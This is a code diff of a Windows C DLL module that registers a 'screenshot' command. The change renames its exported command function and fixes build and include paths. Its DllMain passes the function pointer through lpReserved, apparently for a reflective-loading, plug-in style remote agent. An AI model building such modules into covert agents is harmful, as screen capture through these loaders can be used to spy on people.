@@ -1,5 +1,5 @@
-// cl.exe /LD screenshot.c zlib/*.c cJSON/cJSON.c /Fo.\obj\ /O2 /Ot /GL
-// cl.exe /LD -DDEBUG screenshot.c zlib/*.c cJSON/cJSON.c /Fo.\obj\ /O2 /Ot /GL
+// cl.exe /LD screenshot.c ../zlib/*.c ../cJSON/cJSON.c /Fo.\obj\ /O2 /Ot /GL
+// cl.exe /LD -DDEBUG screenshot.c ../zlib/*.c ../cJSON/cJSON.c /Fo.\obj\ /O2 /Ot /GL
 
 // Current:
 // cl.exe /LD screenshot.c common.c zlib/*.c cJSON/cJSON.c /Fo.\obj\ /O2 /Ot /GL
@@ -23,7 +23,7 @@ def bmp():
 #include "common.h"
 #include "commandlist.h"
 #include "zlib/zlib.h"
-#include "cJSON\cJSON.h"
+#include "cJSON/cJSON.h"
 
 #include <Windows.h>
 #pragma comment(lib, "user32.lib")
@@ -33,12 +33,12 @@ unsigned char* CompressData(unsigned char* data, unsigned long dataSize, unsigne
 char* TakeScreenShot(char *args);
 char* BlobsToJson(DataBlobs* data);
 
-CommandNode* ModuleCommand;
+CommandNode* GadgetCommand;
 
-__declspec(dllexport) CommandNode* GetModuleCommand(void)
+__declspec(dllexport) CommandNode* GetGadgetCommand(void)
 {
-    ModuleCommand = createCommandNode("screenshot", TakeScreenShot);
-    return ModuleCommand;
+    GadgetCommand = createCommandNode("screenshot", TakeScreenShot);
+    return GadgetCommand;
 }
 
 #ifdef DEBUG
@@ -72,7 +72,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
             {
                 MessageBox(NULL, "Setting lpReserved!", "d", MB_ICONINFORMATION);
 				// *(HMODULE *)lpReserved = ShowMessageBox;
-                *(CommandNodePointer*)lpReserved = GetModuleCommand;
+                *(CommandNodePointer*)lpReserved = GetGadgetCommand;
             }
             break;
         case DLL_PROCESS_DETACH:
